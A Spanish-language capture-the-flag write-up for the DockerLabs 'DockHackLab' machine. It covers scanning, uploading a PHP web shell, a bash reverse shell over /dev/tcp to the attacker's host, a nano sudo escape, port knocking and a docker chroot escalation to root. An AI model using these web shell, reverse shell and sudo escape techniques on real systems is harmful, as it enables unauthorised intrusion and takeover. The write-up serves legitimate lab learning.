<img width="519" height="304" alt="image" src="https://github.com/user-attachments/assets/dd7bc047-ea8f-43cd-9cc2-180ceaf50c9d" />



# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: Media](https://img.shields.io/badge/Dificultad-Media-yellow?style=for-the-badge)

```ruby
 nmap -sV -sS -O -Pn -vvv --min-rate 5000 172.17.0.2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
MAC Address: 02:42:AC:11:00:02 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 4.19 (97%), Linux 5.0 - 5.14 (97%), OpenWrt 21.02 (Linux 5.4) (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 6.0 (94%), Linux 5.4 - 5.10 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/21%OT=22%CT=%CU=%PV=Y%DS=1%DC=D%G=N%M=0242AC%TM=69481162%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=107%TI=Z%II=I%TS=A)
SEQ(SP=106%GCD=1%ISR=108%TI=Z%II=I%TS=A)
OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)
```

Con nuestro segundo escaneo mas de lo mismo, solo nos aseguro que es una maquina Linux, si vamos a la pagina web, nos muestra la pagina de instalación de Apache.

```ruby
feroxbuster -u 'http://172.17.0.2/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 --random-agent --no-state -d 5
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2/
 🚩  In-Scope Url          │ 172.17.0.2
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      363l      961w    10671c http://172.17.0.2/index.html
200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
200      GET      363l      961w    10671c http://172.17.0.2/
301      GET        9l       28w      312c http://172.17.0.2/hackademy => http://172.17.0.2/hackademy/
200      GET       75l      145w     1212c http://172.17.0.2/hackademy/styles.css
200      GET        1l       14w       77c http://172.17.0.2/hackademy/upload.php
200      GET       45l       96w     1261c http://172.17.0.2/hackademy/index.html
[################>---] - 12m  3735601/4567959 3m      found:7       errors:0      
[################>---] - 12m  1917355/2283919 2743/s  http://172.17.0.2/ 
[###############>----] - 11m  1816067/2283919 2670/s  http://172.17.0.2/hackademy/
```

Si hacemos fuzzing encontraremos una pagina llamada hackademy para subir archivos, si usamos Wappalyzer nos dice que la pagina web maneja php, así que intentamos subir un archivo php malicioso con nombre cmd.php, y la pagina nos responde con "El archivo cmd.php ha sido subido y alterado xxx_tuarchivo , localizalo y actua."

El contenido de cmd.php es:
```ruby
<?php
  system($_GET['cmd']);
?>
```

Por lo cual procederemos a buscar este archivo modificado haciendo fuzzing, cabe destacar que primero lo intente con el directory-list-2.3-medium.txt pero luego noto que el la pagina nos dice que modifico el archivo y solo muestra 3 x antes del nombre de nuestro archivo, lo que podemos hacer es usar crunch para generar una lista de palabras con 3 caracteres, primero solo de letras y veremos que pasa.
```ryby
¿Comó se usa crunch?

    Ejemplo:  crunch <min-len> <max-len> [<charset string>] [options]
```
```ruby
❯ crunch 3 3 abcdefghijklmnñopqrstuvwxyz -o combinaciones.txt
Notice: Detected unicode characters.  If you are piping crunch output
to another program such as john or aircrack please make sure that program
can handle unicode input.

Do you want to continue? [Y/n] 
Crunch will now generate the following amount of data: 80919 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 19683 

crunch: 100% completed generating output
> ll
.rwxr-xr-x root   root 33 B  Fri Jun 21 11:56:18 2024  cmd.php
.rw-r--r-- root   root    79 KB Sun Oct 13 10:57:01 2024  combinaciones.txt
.rwxr-xr-x root   root   330 B  Tue Oct  1 12:37:10 2024  rshell.php
❯ wc -l combinaciones.txt
19683 combinaciones.txt
```

Como resultado nos devuelve una lista de 19683 palabras de 3 caracteres, procedemos a hacer el fuzzing.

```ruby
❯ ffuf -c -w combinaciones.txt -u "http://172.17.0.2/hackademy/FUZZ_cmd.php" -t 14

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/hackademy/FUZZ_cmd.php
 :: Wordlist         : FUZZ: /root/CTF/Dockerlabs/dockhacklab/content/combinaciones.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 14
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

klp                     [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 48ms]
:: Progress: [19683/19683] :: Job [1/1] :: 432 req/sec :: Duration: [0:00:42] :: Errors: 0 ::

Encuentro mi archivo que responde con 500 por que necesita un parámetro para dar 200, le han agregado klp al principio, si ingreso en la URL: http://172.17.0.2/hackademy/klp_cmd.php?cmd=id el servidor me responde con: uid=33(www-data) gid=33(www-data) groups=33(www-data), en este punto puedo tirar un comando me que devuelva una reverse shell.
```
haremos un revershell con el archivo que subimos  

```ruby 
172.17.0.2/hackademy/kcmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'****
```

# Escalada de Privilegios
### Enumeracion del Sistema
Enumeracion de usuario
```ruby
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
firsthacking:x:1001:1001:,,,:/home/firsthacking:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Listando los permisos de este usario tenemos lo siguiente:
```ruby
sudo -l

User www-data may run the following commands on ed44bf952714:
    (firsthacking) NOPASSWD: /usr/bin/nano # Tenemos una via potencial de migrar de usuario
```

Ahora explotamos el privilego para migrar de usuario:
```ruby
sudo -u firsthacking /usr/bin/nano
ctrl + R -> ctrl + X
reset; sh 1>&0 2>&0
```

###### Usuario `[ FirstHacking ]`:
Listando los permisos para este usuario:
```ruby
sudo -l

User firsthacking may run the following commands on ed44bf952714:
    (ALL) NOPASSWD: /usr/bin/docker # Tenemos una via potencial de migrar a root
```

Listando los permisos de este usuario tenemos el siguiente:
```ruby
-rw-rw-r-- 1 firsthacking firsthacking   40 Jul 15  2024 .docker
```

Listamos su contenido:
```ruby
cat .docker 
que utiles son las funciones del bashrc
```

Ahora si listamos el contenido de configuracion de la **bashrc** tenemos lo siguiente:
```ruby
function docker() {
    echo "�Fijate que hay algo esperando a que llames"
    echo -e "\n 12345 54321 24680 13579 \n"
    echo -e "De nada servira si no llamas antes"
}
```

Si ejecutamos la funcion **docker** nos retorna lo que previamente ya habiamos visto desde el archivo de configuracion:
```ruby
docker

�Fijate que hay algo esperando a que llames

 12345 54321 24680 13579 

De nada servira si no llamas antes
```
 
**PortKnocking** Técnica para ocultar servicios expuestos en contenedores
Técnica de seguridad donde un servicio **solo acepta conexiones** después de recibir una secuencia específica de intentos de conexión (knocks) en puertos cerrados.
**Ejemplo**:
1. Cliente toca puerto **1111** → luego **2222** → luego **3333**
2. El servidor abre el puerto **22** (SSH) solo para esa IP
Proteger servicios sensibles (SSH, Paneles de Admin) en contenedores expuestos a internet.
**Dockerfile**:
```dockerfile
FROM ubuntu:latest  
RUN apt-get update && apt-get install -y knockd  
COPY knockd.conf /etc/knockd.conf  
CMD ["knockd", "-d"]  
```

Archivo **knockd.conf**
```ruby
[options]  
    logfile = /var/log/knockd.log  

[openSSH]  
    sequence    = 7000,8000,9000  
    seq_timeout = 10  
    command     = /usr/sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT  
    tcpflags    = syn  

[closeSSH]  
    sequence    = 9000,8000,7000  
    command     = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT  
```

Sabiendo que la funcion **docker** nos proporciona unos puertos.
Este comando realiza **port knocking** hacia la IP `172.17.0.2` (contenedor Docker) usando una secuencia específica de puertos.
1. **knock**: Herramienta cliente para enviar "knocks"
2. **-v**: Modo verbose (muestra detalles en tiempo real)
3. **172.17.0.2**: IP objetivo (contenedor Docker)
4. **12345 54321 24680 13579**: Secuencia de 4 puertos a "tocar"
5. **-d 1**: Delay de 1 ms entre cada knock (opcional pero útil en redes locales)
```bash
knock -v 172.17.0.2 12345 54321 24680 13579 -d 1
```

Una ves ejecutando obtenemos el siguiente **output**
```ruby
hitting tcp 172.17.0.2:12345
hitting tcp 172.17.0.2:54321
hitting tcp 172.17.0.2:24680
hitting tcp 172.17.0.2:13579
```

Ahora que hemos activado el servicio de **docker** podemos explotar el privilegio
```ruby
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Evidencia de Compromiso
```ruby
# Captura de pantalla o output final
whoami
root
```
